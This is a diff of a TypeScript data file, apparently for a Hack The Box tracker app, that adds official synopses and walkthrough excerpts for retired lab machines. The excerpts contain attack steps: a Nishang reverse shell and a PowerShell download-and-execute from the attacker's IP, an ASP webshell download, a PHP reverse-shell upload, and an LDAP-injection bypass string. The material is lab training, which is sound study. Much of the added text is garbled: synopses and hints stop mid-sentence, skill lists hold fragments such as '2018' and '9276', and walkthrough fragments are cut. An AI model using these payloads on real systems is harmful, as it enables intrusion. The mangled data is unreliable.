+    "officialSynopsis": "Arkham is a medium difficulty Windows box which needs knowledge about encryption, java deserialization and Windows exploitation. A disk image present in an open share is found which is a LUKS encrypted disk. The disk is cracked to obtain configuration files. The Apache MyFaces page running on tomcat is vulnerable to deserialization but the viewstate needs to encrypted. After establishing a foothold an Outlook OST file is found, which contains a screenshot with a password. The user is found to be in the Administrators group, and a UAC bypass can be performed to gain a SYSTEM shell.",
+    "skillsLearned": [
+      "Java Deserialization",
+      "UAC bypass"
+    ],
+    "officialPdf": "179-Arkham_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nArkham is a medium difficulty Windows box which needs knowledge about encryption, java deserialization and Windows exploitation. A disk image present in an open share is found which is a LUKS encrypted disk. The disk is cracked to obtain configuration files. The Apache MyFaces page running on tomcat is vulnerable to deserialization but the viewstate needs to encrypted. After establishing a foothold an Outlook OST file is found, which contains a screenshot with a password. The user is found to be in the Administrators group, and a UAC bypass can be performed to gain a SYSTEM shell.\n\n### 🎯 Core Skills\n- **Java Deserialization**\n- **UAC bypass**\n\n### ⚔️ Foothold Vector\n. A disk image present in an open share is found which is a LUKS encrypted disk. The disk is cracked to obtain configuration files. The Apache MyFaces page running on tomcat is vulnerable to deserialization but the viewstate needs to encrypted. After establishing a foothold an Outlook OST file is found, which contains a screenshot with a password. The user is found to be in the Administrators group, and a UAC bypass can be performed to gain a SYSTEM shell. Skills Required ● Enumeration ● Scripting ● Basic Cryptography Skills Learned ● Java Deserialization ● UAC bypass\n\n### 👑 Privilege Escalation\nENUMERATION We look at the user's groups and find that he's in the Administrators group. So we'll have to stage a UAC bypass to get a SYSTEM shell. Looking at systeminfo we see that the OS is Windows server 19. There can be many ways to do a UAC bypass but there's one specific to Server 19 and more guaranteed to work. According to https://egre55.github.io/system-properties-uac-bypass/ we can bypass UAC through DLL hijacking via SystemPropertiesAdvanced.exe as it auto-elevates. But as SystemPropertiesAdvanced is a GUI app we'll need to be in session 1 to execute it as PSRemoting uses session 0. So, we'll get a meterpreter and migrate to a process in session 1."
   },
   {
     "id": "htb-fortune",
@@ -8974,10 +10777,16 @@ export const INITIAL_MACHINES: Machine[] = [
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/fortune",
     "writeupUrl": "https://0xdf.gitlab.io/tags#fortune",
-    "hint": "Hack The Box Other machine. Rated Insane difficulty.",
+    "hint": "Fortune is an insane difficulty OpenBSD box which hosts a web app vulnerable to RCE. Using the RCE the CA key can be read, which is used to create HTTPS client certificates.",
     "timeSpentSeconds": 0,
     "createdAt": "2019-03-09T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Fortune is an insane difficulty OpenBSD box which hosts a web app vulnerable to RCE. Using the RCE the CA key can be read, which is used to create HTTPS client certificates. The client certificate leads to an SSH login, which helps to bypass the firewall. This allows mounting of an NFS share and dropping a suid to be executed as the user. An application is found to be using faulty encryption logic, which allows for escalation of privileges to root.",
+    "skillsLearned": [
+      "Creating HTTPS client certificates"
+    ],
+    "officialPdf": "178-Fortune_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nFortune is an insane difficulty OpenBSD box which hosts a web app vulnerable to RCE. Using the RCE the CA key can be read, which is used to create HTTPS client certificates. The client certificate leads to an SSH login, which helps to bypass the firewall. This allows mounting of an NFS share and dropping a suid to be executed as the user. An application is found to be using faulty encryption logic, which allows for escalation of privileges to root.\n\n### 🎯 Core Skills\n- **Creating HTTPS client certificates**\n\n### 👑 Privilege Escalation\n. Skills Required ● Enumeration ● Code review Skills Learned ● Creating HTTPS client certificates ● NFS exploitation"
   },
   {
     "id": "htb-netmon",
@@ -8988,12 +10797,15 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "completed",
     "tags": [
+      "2018",
+      "9276",
+      "CVE-2018-9276",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/netmon",
     "writeupUrl": "https://0xdf.gitlab.io/tags#netmon",
-    "hint": "Hack The Box Windows machine. Rated Easy difficulty.",
+    "hint": "Netmon is an easy difficulty Windows box with simple",
     "timeSpentSeconds": 3600,
     "createdAt": "2019-03-02T17:00:00.000000Z",
     "updatedAt": "2026-08-20T11:30:00.000Z",
@@ -9002,7 +10814,14 @@ export const INITIAL_MACHINES: Machine[] = [
     "userPwnedAt": "2026-08-20T10:00:00.000Z",
     "rootPwnedAt": "2026-08-20T11:30:00.000Z",
     "timeToUserSeconds": 1500,
-    "timeToRootSeconds": 3600
+    "timeToRootSeconds": 3600,
+    "officialSynopsis": "Netmon is an easy difficulty Windows box with simple",
+    "skillsLearned": [
+      "2018",
+      "9276"
+    ],
+    "officialPdf": "177-Netmon_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nNetmon is an easy difficulty Windows box with simple\n\n### 🎯 Core Skills\n- **2018**\n- **9276**\n\n### 🛡️ Associated CVEs\n`CVE-2018-9276`\n\n### ⚔️ Foothold Vector\n. PRTG is running, and an FTP server with anonymous access allows reading of PRTG Network Monitor configuration files. The version of PRTG is vulnerable to RCE which can be exploited to gain a SYSTEM shell. Skills Required ● Enumeration Skills Learned ● CVE-2018-9276"
   },
   {
     "id": "htb-hackback",
@@ -9013,15 +10832,25 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Insane",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "ASPX-tunneling",
+      "HTB",
+      "Named-pipe-impersonation"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/hackback",
     "writeupUrl": "https://0xdf.gitlab.io/tags#hackback",
-    "hint": "Hack The Box Windows machine. Rated Insane difficulty.",
+    "hint": "Hackback is an insane difficulty Windows box with some good techniques at play. A GoPhish website is discovered which leads us to some phishing vhosts.",
     "timeSpentSeconds": 0,
     "createdAt": "2019-02-23T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Hackback is an insane difficulty Windows box with some good techniques at play. A GoPhish website is discovered which leads us to some phishing vhosts. While fuzzing for files a javascript file is discovered which is rot13 encoded. It contains sensitive information about an admin page which leads to RCE vulnerability. PHP disabled_functions are in effect, and so ASPX code is used to tunnel and bypass the firewall.",
+    "skillsLearned": [
+      "ASPX tunneling",
+      "Named pipe impersonation",
+      "Exploiting arbitrary writes"
+    ],
+    "officialPdf": "176-Hackback_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nHackback is an insane difficulty Windows box with some good techniques at play. A GoPhish website is discovered which leads us to some phishing vhosts. While fuzzing for files a javascript file is discovered which is rot13 encoded. It contains sensitive information about an admin page which leads to RCE vulnerability. PHP disabled_functions are in effect, and so ASPX code is used to tunnel and bypass the firewall.\n\n### 🎯 Core Skills\n- **ASPX tunneling**\n- **Named pipe impersonation**\n- **Exploiting arbitrary writes**\n\n### ⚔️ Foothold Vector\nAs we already have credentials and can connect to WinRM through the proxy , let's try logging in. We can use this script which uses the ruby winrm module. Make the following change to the script: conn = WinRM::Connection.new( endpoint: 'http://10.10.10.128:5985/wsman', transport: :ssl, user: 'simple', password: 'ZonoProprioZomaro:-(', :no_ssl_peer_verification => true ) Now using it in combination with proxychains should give us a session. rlwrap proxychains ruby winrm_shell_with_upload.rb And we have a shell as the user simple. The user is a member of project-managers group and has SeImpersonatePrivilege enabled which isn't normal for low level users.\n\n### 👑 Privilege Escalation\ndirectory. We don't have access to the util folder and projects has just one document. While enumerating the web folders we see a file web.config.old in the admin folder. This can be downloaded using the download functionality. For help type: help download download /inetpub/wwwroot/new_phish/admin/web.config.old,web.config.old"
   },
   {
     "id": "htb-querier",
@@ -9032,15 +10861,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Excel-macros",
+      "HTB",
+      "PowerView"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/querier",
     "writeupUrl": "https://0xdf.gitlab.io/tags#querier",
-    "hint": "Hack The Box Windows machine. Rated Medium difficulty.",
+    "hint": "Querier is a medium difficulty Windows box which has an Excel spreadsheet in a world-readable file share. The spreadsheet has macros, which connect to MSSQL server running on the box.",
     "timeSpentSeconds": 0,
     "createdAt": "2019-02-16T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Querier is a medium difficulty Windows box which has an Excel spreadsheet in a world-readable file share. The spreadsheet has macros, which connect to MSSQL server running on the box. The SQL server can be used to request a file through which NetNTLMv2 hashes can be leaked and cracked to recover the plaintext password. After logging in, PowerUp can be used to find Administrator credentials in a locally cached group policy file.",
+    "skillsLearned": [
+      "Excel macros",
+      "PowerView"
+    ],
+    "officialPdf": "175-Querier_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nQuerier is a medium difficulty Windows box which has an Excel spreadsheet in a world-readable file share. The spreadsheet has macros, which connect to MSSQL server running on the box. The SQL server can be used to request a file through which NetNTLMv2 hashes can be leaked and cracked to recover the plaintext password. After logging in, PowerUp can be used to find Administrator credentials in a locally cached group policy file.\n\n### 🎯 Core Skills\n- **Excel macros**\n- **PowerView**\n\n### ⚔️ Foothold Vector\nUsing the creds mssql-svc / corporate568 we can now login to MSSQL. Let's check if we have SA permissions now. select IS_SRVROLEMEMBER ('sysadmin') And we see that it returns true. Now, to execute commands use xp_cmdshell. mssqlclient.py mssql-svc@10.10.10.125 -windows-auth enable_xp_cmdshell xp_cmdshell whoami Now we can execute a TCP Reverse shell from Nishang. Download the script and add this line to the end of it. Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.2 -Port 4444 Now run a simple HTTP Server and execute it using powershell. python3 -m http.server 80 xp_cmdshell powershell iex(new-object\n\n### 👑 Privilege Escalation\nAfter getting a shell, PowerUp.ps1 is used to enumerate further. Download the script and execute it on the server using Invoke-AllChecks. wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Privesc/P owerUp.ps1 echo Invoke-AllChecks >> PowerUp.ps1 python3 -m http.server 80 iex(new-object net.webclient).downloadstring(\"http://10.10.16.2/PowerUp.ps1\") After the script runs it finds credentials in the cached Group Policy Preference file, If sysadmins attempt to mitigate the GPP vulnerability by deleting the associated GPO, the cached groups.xml files will remain on the end points. However, if the GPO containing the GPP setting is unlinked from the GPO, the cached groups."
   },
   {
     "id": "htb-friendzone",
@@ -9051,15 +10889,22 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Module-hijacking"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/friendzone",
     "writeupUrl": "https://0xdf.gitlab.io/tags#friendzone",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "FriendZone is an easy difficulty Linux box which needs fair amount",
     "timeSpentSeconds": 0,
     "createdAt": "2019-02-09T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "FriendZone is an easy difficulty Linux box which needs fair amount",
+    "skillsLearned": [
+      "Module hijacking"
+    ],
+    "officialPdf": "173-FriendZone_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nFriendZone is an easy difficulty Linux box which needs fair amount\n\n### 🎯 Core Skills\n- **Module hijacking**\n\n### ⚔️ Foothold Vector\nFrom earlier enumeration we know that the Development share was writable and that the path for the Files share is /etc/Files. Let's assume the path for Development share to be /etc/Development and upload a shell. Use this php reverse shell and change the IP and port. Upload it to the share using smbclient. Now hitting, https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename =/etc/Development/php-reverse-shell Should trigger our reverse shell. And we have a shell as www. Get a tty shell using, python -c \"import pty; pty.spawn('/bin/bash')\"\n\n### 👑 Privilege Escalation\nCRON ENUMERATION Let's use pspy to enumerate the running crons and processes. Download it and upload it to the development share and execute it. cd /tmp cp /etc/Development/pspy64s . chmod +x pspy64s ./pspy64s After a while we find a script running as root, Let's check it out. #!/usr/bin/python import os to_address = \"admin1@friendzone.com\" from_address = \"admin2@friendzone.com\" print \"[+] Trying to send email to %s\"%to_address #command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass \"PAPAP\"''' #os."
   },
   {
     "id": "htb-ctf",
@@ -9070,15 +10915,23 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Insane",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "LDAP-Injection"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/ctf",
     "writeupUrl": "https://0xdf.gitlab.io/tags#ctf",
-    "hint": "Hack The Box Linux machine. Rated Insane difficulty.",
+    "hint": "CTF is an insane difficulty Linux box with a web application using LDAP based authentication. The application is vulnerable to LDAP injection but due to character blacklisting the payloads need to be double URL encoded.",
     "timeSpentSeconds": 0,
     "createdAt": "2019-02-02T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "CTF is an insane difficulty Linux box with a web application using LDAP based authentication. The application is vulnerable to LDAP injection but due to character blacklisting the payloads need to be double URL encoded. After",
+    "skillsLearned": [
+      "LDAP Injection",
+      "Wildcard and Symlink abuse"
+    ],
+    "officialPdf": "172-CTF_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nCTF is an insane difficulty Linux box with a web application using LDAP based authentication. The application is vulnerable to LDAP injection but due to character blacklisting the payloads need to be double URL encoded. After\n\n### 🎯 Core Skills\n- **LDAP Injection**\n- **Wildcard and Symlink abuse**\n\n### ⚔️ Foothold Vector\n, a cron can be exploited to gain sensitive information. Skills Required ● Scripting Skills Learned ● LDAP Injection ● Wildcard and Symlink abuse\n\n### 👑 Privilege Escalation\nor adm group and have a registered token to issue commands on this server\". So apart from the username and OTP check there's an extra filter for the user i.e group. The ldap filter could be something like, (&(&(uid=$_POST)(|(group=root)(group=adm))(pager=token)) We can bypass this by closing the filters and a null byte like this, ldapuser)))%00 Which will result in, (&(&(uid=ldapuser)))%00)(|(group=root)(group=adm))(pager=token)) The part after the null byte gets ignored and the query evaluates to true."
   },
   {
     "id": "htb-flujab",
@@ -9089,15 +10942,26 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Cookie-Tampering",
+      "HTB",
+      "Openssl-PRNG-exploit",
+      "Union-SQL-injection"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/flujab",
     "writeupUrl": "https://0xdf.gitlab.io/tags#flujab",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "FluJab is a hard difficulty Linux box with lot of components and needs a fair amount of",
     "timeSpentSeconds": 0,
     "createdAt": "2019-01-26T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "FluJab is a hard difficulty Linux box with lot of components and needs a fair amount of",
+    "skillsLearned": [
+      "Cookie Tampering",
+      "Union SQL injection",
+      "Openssl PRNG exploit"
+    ],
+    "officialPdf": "171-FluJab_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nFluJab is a hard difficulty Linux box with lot of components and needs a fair amount of\n\n### 🎯 Core Skills\n- **Cookie Tampering**\n- **Union SQL injection**\n- **Openssl PRNG exploit**\n\n### 👑 Privilege Escalation\nENUMERATION Let's check the SUID files on the box. find / -perm -4000 >/dev/null We see an error that the command wasn't found. This is because we didn't fix the path after breaking out of rbash which is still set to /usr/rbin. Set the path and try again. find / -perm -4000 2>/dev/null We see that /usr/local/share/screen/screen is an SUID file."
   },
   {
     "id": "htb-help",
@@ -9108,15 +10972,22 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
+      "GraphQL",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/help",
     "writeupUrl": "https://0xdf.gitlab.io/tags#help",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Help is an Easy Linux box which has a GraphQL endpoint which can be enumerated get a set of credentials for a HelpDesk software. The software is vulnerable to blind SQL injection which can be exploited to get a password for SSH Login.",
     "timeSpentSeconds": 0,
     "createdAt": "2019-01-19T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Help is an Easy Linux box which has a GraphQL endpoint which can be enumerated get a set of credentials for a HelpDesk software. The software is vulnerable to blind SQL injection which can be exploited to get a password for SSH Login. Alternatively an unauthenticated arbitrary file upload can be exploited to get RCE. Then the kernel is found to be vulnerable and can be exploited to get a root shell.",
+    "skillsLearned": [
+      "GraphQL"
+    ],
+    "officialPdf": "170-Help_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nHelp is an Easy Linux box which has a GraphQL endpoint which can be enumerated get a set of credentials for a HelpDesk software. The software is vulnerable to blind SQL injection which can be exploited to get a password for SSH Login. Alternatively an unauthenticated arbitrary file upload can be exploited to get RCE. Then the kernel is found to be vulnerable and can be exploited to get a root shell.\n\n### 🎯 Core Skills\n- **GraphQL**\n\n### ⚔️ Foothold Vector\nAUTHENTICATION SQL INJECTION From initial enumeration we know the version is vulnerable to SQL injection. Lets upload a ticket and fetch the attachment URL. Navigate to Submit and ticket and upload a ticket with an image as attachment. Go to VIew Tickets and open the ticket. Right click on the attachment and copy the link. Request it and intercept in burp. An example ticket is, http://10.10.10.121/support/?v=view_tickets&action=ticket&param[]=4&param[] =attachment&param[]=1&param[]=6 Lets check if it's vulnerable to SQLI, http://10.10.10.\n\n### 👑 Privilege Escalation\nshell. Skills Required ● Enumeration ● Scripting Skills Learned ● GraphQL enumeration ● Blind SQL injection"
   },
   {
     "id": "htb-sizzle",
@@ -9127,15 +10998,28 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Insane",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "DCSync",
+      "HTB",
+      "Kerberoasting",
+      "Passwordless-login",
+      "Stealing-hashes"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/sizzle",
     "writeupUrl": "https://0xdf.gitlab.io/tags#sizzle",
-    "hint": "Hack The Box Windows machine. Rated Insane difficulty.",
+    "hint": "Sizzle is an \"Insane\" difficulty WIndows box with an Active Directory environment. A writable directory in an SMB share allows to steal NTLM hashes which can be cracked to access the Certificate Services Portal.",
     "timeSpentSeconds": 0,
     "createdAt": "2019-01-12T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Sizzle is an \"Insane\" difficulty WIndows box with an Active Directory environment. A writable directory in an SMB share allows to steal NTLM hashes which can be cracked to access the Certificate Services Portal. A self signed certificate can be created using the CA and used for PSRemoting. A SPN associated with a user allows a kerberoast attack on the box. The user is found to have Replication rights which can be abused to get Administrator hashes via DCSync.",
+    "skillsLearned": [
+      "Stealing hashes",
+      "Passwordless login",
+      "Kerberoasting",
+      "DCSync"
+    ],
+    "officialPdf": "169-Sizzle_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nSizzle is an \"Insane\" difficulty WIndows box with an Active Directory environment. A writable directory in an SMB share allows to steal NTLM hashes which can be cracked to access the Certificate Services Portal. A self signed certificate can be created using the CA and used for PSRemoting. A SPN associated with a user allows a kerberoast attack on the box. The user is found to have Replication rights which can be abused to get Administrator hashes via DCSync.\n\n### 🎯 Core Skills\n- **Stealing hashes**\n- **Passwordless login**\n- **Kerberoasting**\n- **DCSync**\n\n### ⚔️ Foothold Vector\nNow that we have a password lets try to login through WinRM. I'll be using this ruby script. Change the configuration to suit our requirement. Trying to login fails because the server expects certificate based authentication. For that we need to create certificates signed by the AD CS. More on passwordless WinRM here. CREATING CERTIFICATES We can login to the AD CS web page using the obtained credentials. To create a certificate first we'll need to create a CSR (Certificate Signing Request). We can use openssl to do the job. openssl genrsa -des3 -out amanda.key 2048 # create private key openssl req -new -key amanda.key -out amanda.csr # create csr ls -la amanda.\n\n### 👑 Privilege Escalation\nLets import PowerView and enumerate the domain. Download PowerView.ps1 into the data folder. wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/Pow erView.ps1 PowerShellImport PowerView.ps1 Now lets see which users have Replication Rights in the DC. powershell Get-ObjectACL \"DC=htb,DC=local\" -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get') } Running this we find an object with SID S-1-5-21-2379389067-1826974543-3574127760-1603 which possesses Replication Rights."
   },
   {
     "id": "htb-conceal",
@@ -9146,15 +11030,23 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "CVE-2018-8440",
+      "HTB",
+      "IKE-Configuration"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/conceal",
     "writeupUrl": "https://0xdf.gitlab.io/tags#conceal",
-    "hint": "Hack The Box Windows machine. Rated Hard difficulty.",
+    "hint": "Conceal is a \"hard\" difficulty Windows which teaches",
     "timeSpentSeconds": 0,
     "createdAt": "2019-01-05T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Conceal is a \"hard\" difficulty Windows which teaches",
+    "skillsLearned": [
+      "IKE Configuration"
+    ],
+    "officialPdf": "168-Conceal_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nConceal is a \"hard\" difficulty Windows which teaches\n\n### 🎯 Core Skills\n- **IKE Configuration**\n\n### 🛡️ Associated CVEs\n`CVE-2018-8440`\n\n### ⚔️ Foothold Vector\nWe can execute system commands with asp scripts. We'll use this simple cmd.asp webshell here. wget https://raw.githubusercontent.com/tennc/webshell/master/asp/webshell.asp -O cmd.asp ftp 10.10.10.116 # put cmd.asp Now we can navigate to http://10.10.10.116/upload/cmd.asp to execute commands.\n\n### 👑 Privilege Escalation\nENUMERATION While running systeminfo we find the version to be WIndows 10 Enterprise Build 15063 and in the HotFix section we see that nothing was patched. The box could be potentially vulnerable to ALPC Task Scheduler LPE CVE-2018-8440. One important condition for the exploit to work is the Read Execute access for Authenticated Users group on the C:\\Windows\\Tasks folder. icacls C:\\Windows\\Tasks"
   },
   {
     "id": "htb-chaos",
@@ -9170,10 +11062,17 @@ export const INITIAL_MACHINES: Machine[] = [
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/chaos",
     "writeupUrl": "https://0xdf.gitlab.io/tags#chaos",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Chaos is a \"medium\" difficulty box which provides an array of challenges to deal with. It requires a fair amount",
     "timeSpentSeconds": 0,
     "createdAt": "2018-12-15T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Chaos is a \"medium\" difficulty box which provides an array of challenges to deal with. It requires a fair amount",
+    "skillsLearned": [
+      "Breaking out of restricted shells",
+      "Extracting data from firefox profiles"
+    ],
+    "officialPdf": "167-Chaos_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nChaos is a \"medium\" difficulty box which provides an array of challenges to deal with. It requires a fair amount\n\n### 🎯 Core Skills\n- **Breaking out of restricted shells**\n- **Extracting data from firefox profiles**\n\n### ⚔️ Foothold Vector\n. Password reuse helps to land a shell as a user but in a restricted shell which can be bypassed by abusing a GTFObin. Escaping the shell gives access to the user's firefox folder containing saved logins which on decrypting gives access to a webadmin console and the\n\n### 👑 Privilege Escalation\nshell. Skills Required ● Web server enumeration ● Wordpress enumeration Skills Learned ● Breaking out of restricted shells ● Extracting data from firefox profiles"
   },
   {
     "id": "htb-lightweight",
@@ -9184,15 +11083,23 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Passive-Sniffing"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/lightweight",
     "writeupUrl": "https://0xdf.gitlab.io/tags#lightweight",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Lightweight is a pretty unique and challenging box which showcases the common mistakes made by system administrators and the need for encryption in any kind protocol used. It deals with the abuse of Linux capabilities which can be harmful in bad hands and how unencrypted protocol",
     "timeSpentSeconds": 0,
     "createdAt": "2018-12-08T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Lightweight is a pretty unique and challenging box which showcases the common mistakes made by system administrators and the need for encryption in any kind protocol used. It deals with the abuse of Linux capabilities which can be harmful in bad hands and how unencrypted protocols like LDAP can be sniffed to gain information and credentials.",
+    "skillsLearned": [
+      "Passive Sniffing",
+      "Abusing Linux Capabilities"
+    ],
+    "officialPdf": "166-Lightweight_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nLightweight is a pretty unique and challenging box which showcases the common mistakes made by system administrators and the need for encryption in any kind protocol used. It deals with the abuse of Linux capabilities which can be harmful in bad hands and how unencrypted protocols like LDAP can be sniffed to gain information and credentials.\n\n### 🎯 Core Skills\n- **Passive Sniffing**\n- **Abusing Linux Capabilities**\n\n### ⚔️ Foothold Vector\nWith the credentials provided it's possible to login to the box using ssh. ssh 10.10.16.25@10.10.10.119 #password: 10.10.16.25 This lands us into a low privilege shell restricted by SELinux. ENUMERATION After gaining a shell LinEnum.sh is executed with thorough mode enabled to enumerate the box. cd /tmp wget 10.10.16.25/LinEnum.sh bash LinEnum.sh -t 1 On running the script an unusual binary is seen with it's capability bit set. Linux capabilities is a feature which helps System Administrators to give a binary certain permissions which are needed to perform daily tasks without giving a user\n\n### 👑 Privilege Escalation\n@Ubuntu:~/Documents/HTB/Lightweight# ldapsearch -h 10.10.10.119 -x -b \"dc=lightweight,dc=htb\" # extended LDIF # # LDAPv3 # base <dc=lightweight,dc=htb> with scope subtree # filter: (objectclass=*) # requesting: ALL # # lightweight.htb dn: dc=lightweight,dc=htb objectClass: top objectClass: dcObject objectClass: organization o: lightweight htb dc: lightweight # Manager, lightweight.htb dn: cn=Manager,dc=lightweight,dc=htb objectClass: organizationalRole cn: Manager description: Directory Manager # People, lightweight.htb dn: ou=People,dc=lightweight,dc=htb"
   },
   {
     "id": "htb-teacher",
@@ -9203,15 +11110,23 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "CVE-2018-1133",
+      "HTB",
+      "Website"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/teacher",
     "writeupUrl": "https://0xdf.gitlab.io/tags#teacher",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Teacher is a \"medium\" difficulty machine, which teaches techniques for identifying and exploiting logical flaws and vulnerabilities of outdated modules within popular CMS (in this instance Moodle),",
     "timeSpentSeconds": 0,
     "createdAt": "2018-12-01T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Teacher is a \"medium\" difficulty machine, which teaches techniques for identifying and exploiting logical flaws and vulnerabilities of outdated modules within popular CMS (in this instance Moodle),",
+    "skillsLearned": [
+      "Website"
+    ],
+    "officialPdf": "165-Teacher_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nTeacher is a \"medium\" difficulty machine, which teaches techniques for identifying and exploiting logical flaws and vulnerabilities of outdated modules within popular CMS (in this instance Moodle),\n\n### 🎯 Core Skills\n- **Website**\n\n### 🛡️ Associated CVEs\n`CVE-2018-1133`\n\n### ⚔️ Foothold Vector\n● Database Enumeration ● Password Cracking ● Linux Symlink Misconfiguration\n\n### 👑 Privilege Escalation\n'; $CFG->dbpass = 'Welkom1!'; $CFG->prefix = 'mdl_'; $CFG->dboptions = array ( 'dbpersist' => 0, 'dbport' => 3306, 'dbsocket' => '', 'dbcollation' => 'utf8mb4_unicode_ci', ); $CFG->wwwroot = 'http://10.10.10.153/moodle'; $CFG->dataroot = '/var/www/moodledata'; $CFG->admin = 'admin'; $CFG->directorypermissions = 0777; require_once(__DIR__ . '/lib/setup.php'); // There is no php closing tag in this file, // it is intentional because it prevents trailing whitespace problems! The credentials retrieved are the following: root:Welkom1!"
   },
   {
     "id": "htb-bighead",
@@ -9222,15 +11137,26 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Insane",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Egg-hunting-technique",
+      "Extracting-ADS",
+      "HTB",
